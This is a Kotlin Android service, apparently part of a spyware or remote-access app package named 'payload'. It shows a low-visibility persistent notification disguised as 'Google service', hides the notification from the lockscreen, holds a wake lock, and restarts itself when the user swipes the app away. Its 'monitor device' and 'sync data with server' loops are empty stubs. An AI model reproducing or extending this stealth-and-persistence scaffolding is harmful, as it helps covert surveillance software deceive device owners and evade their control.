package com.payload.jansiix0ne.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.payload.jansiix0ne.MainActivity
import com.payload.jansiix0ne.R
import kotlinx.coroutines.*
import kotlin.coroutines.coroutineContext

class UnifiedService : Service() {

    private val TAG = "UnifiedService"
    private val CHANNEL_ID = "HideIconServiceChannel"
    private val NOTIFICATION_ID = 1
    
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private var wakeLock: PowerManager.WakeLock? = null
    
    companion object {
        @Volatile
        var isRunning = false
    }

    override fun onCreate() {
        super.onCreate()
        
        // Create notification channel
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Background Service",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            setSound(null, null)
            enableVibration(false)
            enableLights(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
            setShowBadge(false)
        }
        
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager?.createNotificationChannel(channel)
        
        // Create notification
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google service")
            .setSmallIcon(R.drawable.ic_success)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
        
        startForeground(NOTIFICATION_ID, notification)
        
        // Acquire wake lock
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "UnifiedService::lock"
            )
            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
            Log.d(TAG, "WakeLock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire wake lock: ${e.message}")
        }
        
        // Start monitoring tasks
        serviceScope.launch {
            monitorDevice()
        }
        
        serviceScope.launch {
            syncData()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) {
            Log.d(TAG, "Already running, skip duplicate start")
            return START_STICKY
        }
        
        isRunning = true
        
        serviceScope.launch {
            performPeriodicTasks()
        }
        
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        
        wakeLock?.release()
        serviceScope.cancel()
    }

    override fun onTaskRemoved(intent: Intent?) {
        super.onTaskRemoved(intent)
        
        // Restart service when task is removed
        serviceScope.launch {
            delay(1000)
            val restartIntent = Intent(applicationContext, UnifiedService::class.java)
            startForegroundService(restartIntent)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private suspend fun monitorDevice() {
        while (coroutineContext.isActive) {
            try {
                // Monitor device status
                Log.d(TAG, "Monitoring device...")
                delay(60000) // Check every minute
            } catch (e: Exception) {
                Log.e(TAG, "Error in monitorDevice", e)
            }
        }
    }

    private suspend fun syncData() {
        while (coroutineContext.isActive) {
            try {
                // Sync data with server
                Log.d(TAG, "Syncing data...")
                delay(300000) // Sync every 5 minutes
            } catch (e: Exception) {
                Log.e(TAG, "Error in syncData", e)
            }
        }
    }

    private suspend fun performPeriodicTasks() {
        while (coroutineContext.isActive) {
            try {
                // Perform periodic tasks
                Log.d(TAG, "Performing periodic tasks...")
                delay(600000) // Every 10 minutes
            } catch (e: Exception) {
                Log.e(TAG, "Error in performPeriodicTasks", e)
            }
        }
    }
}
